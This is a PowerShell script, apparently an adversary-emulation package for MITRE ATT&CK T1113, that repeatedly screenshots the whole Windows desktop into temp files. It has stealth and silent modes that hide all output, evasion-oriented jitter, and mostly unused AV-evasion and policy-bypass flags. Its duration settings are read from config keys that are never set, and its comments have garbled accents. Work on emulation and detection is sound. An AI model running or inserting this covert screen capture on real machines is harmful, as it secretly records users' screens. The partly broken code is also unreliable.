# T1113.002A - Continuous Screen Recording
# MITRE ATT&CK Enterprise - TA0009 - Collection
# ATOMIC ACTION: record screen activity for specified duration ONLY
# Platform: Windows | Privilege: User | Type: Atomic Package

param()

function Get-Configuration {
    # Validation des pr  conditions contractuelles Deputy avec granularit   maximale Windows
    $config = @{
        # Configuration de base universelle
        "OUTPUT_BASE" = if ($env:T1113_002A_OUTPUT_BASE) { $env:T1113_002A_OUTPUT_BASE } else { "$env:TEMP\mitre_results" }
        "TIMEOUT" = if ($env:T1113_002A_TIMEOUT) { [int]$env:T1113_002A_TIMEOUT } else { 300 }
        "DEBUG_MODE" = $env:T1113_002A_DEBUG_MODE -eq "true"
        "STEALTH_MODE" = $env:T1113_002A_STEALTH_MODE -eq "true"
        "VERBOSE_LEVEL" = if ($env:T1113_002A_VERBOSE_LEVEL) { [int]$env:T1113_002A_VERBOSE_LEVEL } else { 1 }
        
        # Adaptation Windows sp  cifique
        "OS_TYPE" =  "windows"
        "SHELL_TYPE" =  "powershell"
        "EXEC_METHOD" = if ($env:T1113_002A_EXEC_METHOD) { $env:T1113_002A_EXEC_METHOD } else { "native" }
        
        # Gestion d'erreur sophistiqu  e
        "RETRY_COUNT" = if ($env:T1113_002A_RETRY_COUNT) { [int]$env:T1113_002A_RETRY_COUNT } else { 3 }
        "RETRY_DELAY" = if ($env:T1113_002A_RETRY_DELAY) { [int]$env:T1113_002A_RETRY_DELAY } else { 5 }
        "FALLBACK_MODE" = if ($env:T1113_002A_FALLBACK_MODE) { $env:T1113_002A_FALLBACK_MODE } else { "simulate" }
        
        # Policy-awareness Windows (MDM/GPO/EDR)
        "POLICY_CHECK" = if ($env:T1113_002A_POLICY_CHECK) { $env:T1113_002A_POLICY_CHECK -eq "true" } else { $true }
        "POLICY_BYPASS" = $env:T1113_002A_POLICY_BYPASS -eq "true"
        "POLICY_SIMULATE" = if ($env:T1113_002A_POLICY_SIMULATE) { $env:T1113_002A_POLICY_SIMULATE -eq "true" } else { $false }
        
        # Variables sp  cialis  es
        "OUTPUT_MODE" = if ($env:T1113_002A_OUTPUT_MODE) { $env:T1113_002A_OUTPUT_MODE } else { "simple" }
        "SILENT_MODE" = $env:T1113_002A_SILENT_MODE -eq "true"
        
        # Defense Evasion Windows
        "OBFUSCATION_LEVEL" = if ($env:T1113_002A_OBFUSCATION_LEVEL) { [int]$env:T1113_002A_OBFUSCATION_LEVEL } else { 0 }
        "AV_EVASION" = $env:T1113_002A_AV_EVASION -eq "true"
        "SANDBOX_DETECTION" = if ($env:T1113_002A_SANDBOX_DETECTION) { $env:T1113_002A_SANDBOX_DETECTION -eq "true" } else { $true }
        "SLEEP_JITTER" = if ($env:T1113_002A_SLEEP_JITTER) { [int]$env:T1113_002A_SLEEP_JITTER } else { 0 }
        
        # Telemetry
        "ECS_VERSION" = if ($env:T1113_002A_ECS_VERSION) { $env:T1113_002A_ECS_VERSION } else { "8.0" }
        "CORRELATION_ID" = if ($env:T1113_002A_CORRELATION_ID) { $env:T1113_002A_CORRELATION_ID } else { "auto" }
    }
    
    # Auto-g  n  ration correlation ID pour cha  nage DAG
    if ($Config.CORRELATION_ID -eq "auto") {
        $Config.CORRELATION_ID = "T1113_002A_" + (Get-Date -Format "yyyyMMdd_HHmmss") + "_" + (Get-Random -Maximum 9999)
    }
    
    return $config
}

function Invoke-MicroTechniqueAction {
    param([hashtable]$Config)
    
    # ATOMIC ACTION: record screen activity for specified duration ONLY
    if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
        Write-Host "[INFO] Starting atomic record screen activity for specified duration..." -ForegroundColor Yellow
    }
    
    # Sleep jitter pour   vasion d  tection
    if ($Config.SLEEP_JITTER -gt 0) {
        Start-Sleep -Seconds (Get-Random -Maximum $Config.SLEEP_JITTER)
    }
    
    $results = @{
        "action" =  "record_screen_activity_for_specified_duration"
        "technique_id" =  "T1113.002A"
        "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
        "hostname" = $env:COMPUTERNAME
        "username" = $env:USERNAME
        "privilege_level" =  "user"
    }
    
    try {
        # Prepare output directory
        $outputDir = Join-Path $Config.OUTPUT_BASE "t1113_002a"
        if (-not (Test-Path $outputDir)) {
            New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
        }
        
        # Mode simulation policy-aware
        if ($Config.EXEC_METHOD -eq "simulate") {
            $results.results = @{
                "status" =  "success"
                "simulation" = $true
                "action_performed" =  "record screen activity for specified duration"
                "output_directory" = $outputDir
            }
            
            $results.postconditions = @{
                "action_completed" = $true
                "output_generated" = $false
                "policy_compliant" = $true
                "simulated" = $true
            }
            
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                Write-Host "[SIMULATE] record screen activity for specified duration simulated successfully" -ForegroundColor Yellow
            }
            
            return $results
        }
        
        # ATOMIC ACTION EXECUTION: Continuous screen recording
        $startTime = Get-Date

        # Add required assemblies for screen capture
        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop

        # Configuration for continuous recording
        $captureDuration = if ($Config.T1113_002A_DURATION_SECONDS) { $Config.T1113_002A_DURATION_SECONDS } else { 30 }
        $captureInterval = if ($Config.T1113_002A_CAPTURE_INTERVAL_MS) { $Config.T1113_002A_CAPTURE_INTERVAL_MS } else { 1000 }
        $maxCaptures = if ($Config.T1113_002A_MAX_CAPTURES) { $Config.T1113_002A_MAX_CAPTURES } else { 30 }

        $captures = @()
        $captureCount = 0

        # Get screen bounds
        $bounds = [Windows.Forms.SystemInformation]::VirtualScreen

        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            Write-Host "[INFO] Starting continuous screen recording for $captureDuration seconds..." -ForegroundColor Green
        }

        # Continuous recording loop
        $recordingStartTime = Get-Date
        while (((Get-Date) - $recordingStartTime).TotalSeconds -lt $captureDuration -and $captureCount -lt $maxCaptures) {

            try {
                # Create bitmap and capture screen
                $bitmap = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
                $graphics = [Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)

                # Generate filename with timestamp
                $timestamp = Get-Date -Format "yyyyMMdd_HHmmss_fff"
                $filename = "screen_capture_$timestamp.png"
                $filepath = Join-Path $outputDir $filename

                # Save the bitmap
                $bitmap.Save($filepath, [Drawing.Imaging.ImageFormat]::Png)

                # Record capture details
                $captureInfo = @{
                    "filename" = $filename
                    "filepath" = $filepath
                    "timestamp" = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                    "resolution" = "$($bounds.Width)x$($bounds.Height)"
                    "file_size_bytes" = (Get-Item $filepath).Length
                    "sequence_number" = $captureCount + 1
                }
                $captures += $captureInfo

                $captureCount++

                if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                    Write-Host "[CAPTURE] Saved frame $captureCount to $filename" -ForegroundColor Gray
                }

                # Clean up resources
                $graphics.Dispose()
                $bitmap.Dispose()

                # Wait for next capture interval
                if (((Get-Date) - $recordingStartTime).TotalSeconds -lt $captureDuration) {
                    Start-Sleep -Milliseconds $captureInterval
                }

            } catch {
                if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
                    Write-Host "[WARNING] Failed to capture screen frame: $($_.Exception.Message)" -ForegroundColor Yellow
                }
                break
            }
        }

        $endTime = Get-Date
        $totalDuration = ($endTime - $startTime).TotalSeconds

        $results.results = @{
            "status" =  "success"
            "action_performed" =  "record screen activity for specified duration"
            "output_directory" = $outputDir
            "items_processed" = $captureCount
            "total_duration_seconds" = $totalDuration
            "capture_interval_ms" = $captureInterval
            "total_captures" = $captureCount
            "screen_resolution" = "$($bounds.Width)x$($bounds.Height)"
            "captures" = $captures
            "performance_metrics" = @{
                "total_duration" = $totalDuration
                "average_capture_time" = if ($captureCount -gt 0) { $totalDuration / $captureCount } else { 0 }
                "capture_rate_per_second" = if ($totalDuration -gt 0) { $captureCount / $totalDuration } else { 0 }
            }
        }
        
        $results.postconditions = @{
            "action_completed" = $true
            "output_generated" = $true
            "policy_compliant" = $true
        }
        
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            Write-Host "[SUCCESS] record screen activity for specified duration completed successfully" -ForegroundColor Green
        }
    }
    catch {
        $results.results = @{
            "status" =  "error"
            "error" = $_.Exception.Message
        }
        
        $results.postconditions = @{
            "action_completed" = $false
            "output_generated" = $false
            "policy_compliant" = $Config.EXEC_METHOD -ne "denied"
        }
        
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            Write-Error "record screen activity for specified duration failed: $($_.Exception.Message)"
        }
    }
    
    return $results
}

function Write-StandardizedOutput {
    param([hashtable]$Data, [hashtable]$Config)
    
    $outputDir = Join-Path $Config.OUTPUT_BASE "t1113_002a"
    if (-not (Test-Path $outputDir)) {
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }
    
    # Mode stealth complet - aucune sortie si SILENT_MODE
    if ($Config.SILENT_MODE -and $Config.OUTPUT_MODE -eq "stealth") {
        return $outputDir
    }
    
    switch ($Config.OUTPUT_MODE) {
        "simple" {
            if ($Data.results.status -eq "success") {
                $simpleOutput = "CONTINUOUS SCREEN RECORDING "
                $simpleOutput += "`nAction: record screen activity for specified duration"
                $simpleOutput += "`nStatus: Success"
            } else {
                $simpleOutput = "record screen activity for specified duration failed: $($Data.results.error)"
            }
            
            if (-not $Config.SILENT_MODE) {
                Write-Output $simpleOutput
                $simpleOutput | Out-File -FilePath (Join-Path $outputDir "results_simple.txt") -Encoding UTF8
            }
        }
        
        "debug" {
            $jsonFile = Join-Path $outputDir "results_debug.json"
            $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
            
            if ($Config.VERBOSE_LEVEL -ge 2 -and -not $Config.SILENT_MODE) {
                Write-Host "[DEBUG] Results written to: $jsonFile" -ForegroundColor Cyan
            }
        }
        
        "stealth" {
            if (-not $Config.SILENT_MODE) {
                $jsonFile = Join-Path $outputDir "results_stealth.json"
                $Data | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
            }
        }
    }
    
    return $outputDir
}

function Main {
    try {
        $Config = Get-Configuration
        $results = Invoke-MicroTechniqueAction -Config $config
        $outputPath = Write-StandardizedOutput -Data $results -Config $config
        
        # Validation des postconditions contractuelles Deputy
        if (-not $results.postconditions.action_completed -and $Config.EXEC_METHOD -ne "simulate") {
            throw "Postcondition failed: action not completed"
        }
        
        if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.STEALTH_MODE -and -not $Config.SILENT_MODE) {
            Write-Host "[COMPLETE] T1113.002A atomic execution finished - Output: $outputPath" -ForegroundColor Green
        }
        
        return 0  # SUCCESS
    }
    catch {
        $errorMessage = $_.Exception.Message
        
        # Codes de retour explicites Deputy
        if ($errorMessage -like "*Precondition*") {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "SKIPPED_PRECONDITION: $errorMessage"
            }
            exit 2
        } 
        elseif ($errorMessage -like "*Policy*") {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "DENIED_POLICY: $errorMessage"
            }
            exit 3
        } 
        elseif ($errorMessage -like "*Postcondition*") {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "FAILED_POSTCONDITION: $errorMessage"
            }
            exit 4
        }
        else {
            if ($Config.VERBOSE_LEVEL -ge 1 -and -not $Config.SILENT_MODE) {
                Write-Error "FAILED: Micro-technique execution failed: $errorMessage"
            }
            exit 1
        }
    }
}

exit (Main)



